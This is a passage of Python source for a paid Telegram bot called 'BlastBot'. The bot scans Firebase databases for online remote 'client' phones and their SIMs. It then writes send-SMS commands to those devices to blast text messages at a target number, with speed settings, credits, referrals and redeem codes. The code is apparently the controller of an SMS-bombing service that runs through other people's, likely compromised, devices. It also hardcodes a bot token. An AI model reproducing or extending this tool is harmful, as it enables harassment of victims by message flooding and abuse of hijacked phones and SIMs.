import asyncio, json, os, time, logging, random, string, threading, io, re, shutil, platform, sys
from datetime import datetime
from copy import deepcopy
from collections import defaultdict

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile, BufferedInputFile
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

# ========== FILE LOCK FOR RACE CONDITION PROTECTION ==========
_DB_LOCK = threading.Lock()


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"      # 🔥
EMOJI_STAR = "5372849966689566579"      # ⭐
EMOJI_ROCKET = "5359664288241829619"    # 🚀
EMOJI_CROWN = "6237927637906364256"     # 👑
EMOJI_SHIELD = "6235476345451716705"    # 🛡
EMOJI_MONEY = "6244678063775289843"     # 💰
EMOJI_PHONE = "6239930832128056797"     # 📱
EMOJI_CHECK = "4958689671950369798"     # ✅
EMOJI_CROSS = "4958900559139570572"     # ❌
EMOJI_WARNING = "4958526153955476488"   # ⚠️
EMOJI_LOCK = "4956719506027185156"      # 🔒
EMOJI_GIFT = "5084613633418199991"      # 🎁
EMOJI_BELL = "5098265504796115765"      # 🔔
EMOJI_GEAR = "5116414868357907335"      # ⚙️
EMOJI_VIDEO = "5372849966689566579"     # 📹

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs = {"text": label, "callback_data": callback_data}
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    kwargs["style"] = style if style in ["primary", "success", "danger"] else "primary"
    return InlineKeyboardButton(**kwargs)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs = {"text": label, "url": url}
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    kwargs["style"] = style if style in ["primary", "success", "danger"] else "primary"
    return InlineKeyboardButton(**kwargs)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    return KeyboardButton(
        text=sc(text),
        style=style if style in ["primary", "success", "danger"] else None,
        request_contact=request_contact,
        request_location=request_location
    )

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Start Blast", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")]
        ],
        resize_keyboard=True
    )

MAIN_OWNER = 8984851474
SUPER_ADMIN_NAME = "@WhoIsShown"
SUPER_ADMIN_LINK = "https://t.me/WhoIsShown"
SUPER_ADMINS = [8984851474]

BOT_TOKEN = "8783298629:AAFjebo96-FOfjcWPp9QzqOHAeOjO4iNnco"
LOG_CHANNEL_ID = -1003978116236

_DATA_FILE = "bla1st_data.json"
_VERSION = "v5.1-PREMIUM"
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 60.0

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

async def background_backup_sender(bot: Bot):
    log.info("Background JSON Backup Task STARTED")
    while True:
        await asyncio.sleep(3600)
        try:
            if os.path.exists(_DATA_FILE):
                caption_text = (
                    f"📦 <b>AUTOMATIC DATABASE BACKUP</b>\n\n"
                    f"📅 <b>Date & Time:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
                    f"📂 <b>File:</b> <code>{_DATA_FILE}</code>"
                )
                await bot.send_document(
                    chat_id=LOG_CHANNEL_ID,
                    document=FSInputFile(_DATA_FILE),
                    caption=caption_text,
                    parse_mode="HTML"
                )
                log.info("Automatic database backup successfully sent to log channel.")
        except Exception as e:
            log.error(f"Failed to send automatic database backup: {e}")

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid', 'blast_data']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None
        self.blast_data = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    add_media_spoiler_confirm = State()
    v5_user_lookup = State()
    v5_support_message = State()
    v5_ticket_reply = State()
    v5_studio_text = State()
    v5_studio_video = State()
    v5_studio_help = State()
    v5_clone_source = State()
    v5_clone_target = State()
    v5_clone_confirm = State()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
        "support_tickets": [],
        "v5_searches": [],
        "v5_start_screen": {"welcome_text": "", "welcome_video_file_id": "", "help_text": "Welcome! Use the menu buttons to navigate and contact support if you need help."}
    }

def load() -> dict:
    with _DB_LOCK:
        if os.path.exists(_DATA_FILE):
            try:
                with open(_DATA_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                default = _default_data()
                for k, v in default.items():
                    if k not in data:
                        data[k] = v
                if MAIN_OWNER not in data.get("owners", []):
                    data["owners"].insert(0, MAIN_OWNER)
                for uid_str, u in data.get("users", {}).items():
                    if "credits" not in u:
                        u["credits"] = 0
                    if "sms_history" not in u:
                        u["sms_history"] = []
                    if "manual_added_credits" not in u:
                        u["manual_added_credits"] = 0
                # Load protected numbers from disk into global
                global PROTECTED_NUMBERS
                PROTECTED_NUMBERS = data.get("protected_numbers", {})
                return data
            except Exception as e:
                log.error(f"Load error: {e}")
        d = _default_data()
        save(d)
        return d

def save(d: dict):
    with _DB_LOCK:
        # Sync PROTECTED_NUMBERS into data before saving
        d["protected_numbers"] = PROTECTED_NUMBERS
        with open(_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)

def atomic_update(mutate_fn):
    """
    Load, mutate, save — all under a SINGLE lock hold so no other
    load()/save() pair can interleave and clobber this write.
    This fixes the 'Invalid redeem code' bug caused by lost updates
    when two handlers race between separate load() and save() calls.
    mutate_fn(d) -> returns whatever you want back to the caller.
    """
    with _DB_LOCK:
        if os.path.exists(_DATA_FILE):
            try:
                with open(_DATA_FILE, "r", encoding="utf-8") as f:
                    d = json.load(f)
            except Exception as e:
                log.error(f"atomic_update load error: {e}")
                d = _default_data()
        else:
            d = _default_data()

        default = _default_data()
        for k, v in default.items():
            if k not in d:
                d[k] = v
        if MAIN_OWNER not in d.get("owners", []):
            d["owners"].insert(0, MAIN_OWNER)
        for uid_str, u in d.get("users", {}).items():
            if "credits" not in u:
                u["credits"] = 0
            if "sms_history" not in u:
                u["sms_history"] = []
            if "manual_added_credits" not in u:
                u["manual_added_credits"] = 0

        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d.get("protected_numbers", {})

        result = mutate_fn(d)

        d["protected_numbers"] = PROTECTED_NUMBERS
        with open(_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)

        return result

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "manual_added_credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict, is_manual: bool = False):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0, "manual_added_credits": 0}
    if "manual_added_credits" not in d["users"][k]:
        d["users"][k]["manual_added_credits"] = 0
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount
    if is_manual:
        d["users"][k]["manual_added_credits"] += amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d, is_manual=False)
    add_credits(referrer_uid, ref_credits, d, is_manual=False)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍE! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    """
    Sends one random media item (photo or video) from the saved media library.
    Backward compatible: old entries stored as plain file_id strings are treated
    as videos with no spoiler. New entries are dicts: {"type": "video"|"photo", "file_id": ..., "spoiler": bool}.
    """
    d = load()
    videos = d.get("videos", [])
    if not videos:
        return
    media_item = random.choice(videos)

    if isinstance(media_item, dict):
        media_type = media_item.get("type", "video")
        file_id    = media_item.get("file_id")
        spoiler    = bool(media_item.get("spoiler", False))
    else:
        media_type = "video"
        file_id    = media_item
        spoiler    = False

    if not file_id:
        return

    try:
        if media_type == "photo":
            await bot.send_photo(chat_id, photo=file_id, caption=caption, parse_mode="HTML", has_spoiler=spoiler)
        else:
            await bot.send_video(chat_id, video=file_id, caption=caption, parse_mode="HTML", has_spoiler=spoiler)
    except Exception as e:
        log.error(f"Failed to send random media: {e}")

async def send_media_with_caption(bot: Bot, chat_id: int, d: dict, text: str, markup):
    """
    Ek HI message mein media + text: random photo/video ko `text` caption
    aur inline keyboard ke saath bhejta hai. Media nahi hai ya caption
    1000 chars se zyada hai toh plain text message bhejta hai (fallback).
    """
    videos = d.get("videos", [])
    visible_len = len(re.sub(r"<[^>]+>", "", text))
    if videos and visible_len <= 1000:
        item = random.choice(videos)
        if isinstance(item, dict):
            mtype = item.get("type", "video")
            fid = item.get("file_id")
            spoiler = bool(item.get("spoiler", False))
        else:
            mtype, fid, spoiler = "video", item, False
        try:
            if mtype == "photo":
                await bot.send_photo(chat_id, photo=fid, caption=text, parse_mode="HTML",
                                     reply_markup=markup, has_spoiler=spoiler)
            else:
                await bot.send_video(chat_id, video=fid, caption=text, parse_mode="HTML",
                                     reply_markup=markup, has_spoiler=spoiler)
            return
        except Exception as e:
            log.error(f"Combined media send failed: {e}")
    await bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

async def safe_edit(message, text, reply_markup=None, parse_mode="HTML", **kwargs):
    """
    Media message (photo/video caption) aur plain text message dono ko handle karta hai.
    edit_text fail ho jaye (media message pe) toh edit_caption use karta hai.
    """
    try:
        return await message.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode, **kwargs)
    except TelegramBadRequest:
        kwargs.pop("disable_web_page_preview", None)
        return await message.edit_caption(caption=text, reply_markup=reply_markup, parse_mode=parse_mode, **kwargs)

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c, style="primary") for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="danger"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="success")
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")]
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS

    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."

    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"

    device_count = len(CACHED_DEVICES)
    time_diff = time.time() - LAST_SCAN_TIME

    if time_diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {device_count} ᴅᴇᴠɪᴄᴇs"
    elif time_diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"
    else:
        return f"{em(EMOJI_CROSS, '🔴')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG

    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
        start_scan = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])

            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan

            CACHED_DEVICES = devices

            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time())
                }
            LAST_SCAN_TIME = time.time()

            health_entry = {
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices"
            }
            DEVICE_HEALTH_LOG.append(health_entry)
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
                log.info(f"[BG-SCAN] {len(devices)} devices online | {len(fbs)} DBs | {scan_duration:.1f}s")

                current_fb_ids = {fb["id"] for fb in fbs}
                stale_fb_ids = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
                for stale in stale_fb_ids:
                    FB_DEVICE_COUNTS.pop(stale, None)

                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('background scanner active!')}</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs: <b>{len(fbs)}</b>\n"
                            f"{em(EMOJI_GEAR, '🔄')} ᴀᴜᴛᴏ-sᴄᴀɴ: ᴇᴠᴇʀʏ <b>1 ᴍɪɴᴜᴛᴇ</b>\n"
                            f"{em(EMOJI_WARNING, '⏱')} sᴄᴀɴ ᴛɪᴍᴇ: <b>{scan_duration:.1f}s</b>\n\n"
                            f"<i>{sc('bot is now running in ultra mode with per-user sessions.')}</i>",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        log.warning(f"Owner notify failed: {e}")
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"

        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return {}
                    return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]

    _dev_sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200:
                        return
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return
                    device_ids = json.loads(txt)
                    if not isinstance(device_ids, dict):
                        return

                    async def fetch_dev(dev_id: str):
                        try:
                            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                            async with _dev_sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status == 200:
                                        txt2 = (await r2.text()).strip()
                                        if txt2 == "null" or not txt2:
                                            return None
                                        dev_data = json.loads(txt2)
                                        if isinstance(dev_data, dict) and device_is_online(dev_data):
                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                            sims = dev_data.get("sims", [])
                                            return {
                                                "fb_id": fb["id"],
                                                "fb_url": fb["url"],
                                                "fb_label": fb.get("label", fb["url"][:30]),
                                                "dev_id": dev_id,
                                                "dev_name": name,
                                                "sims": sims,
                                            }
                        except Exception as e:
                            log.warning(f"Device fetch {dev_id}: {e}")
                        return None

                    dev_ids = list(device_ids.keys())
                    for i in range(0, len(dev_ids), 20):
                        batch = dev_ids[i:i+20]
                        dev_tasks = [fetch_dev(dev_id) for dev_id in batch]
                        dev_results = await asyncio.gather(*dev_tasks)
                        for res in dev_results:
                            if res:
                                results.append(res)
        except Exception as e:
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time())
        }
    )

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d):
        return True, []

    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []

    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔", style="success")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fmt_time(ts: int) -> str:
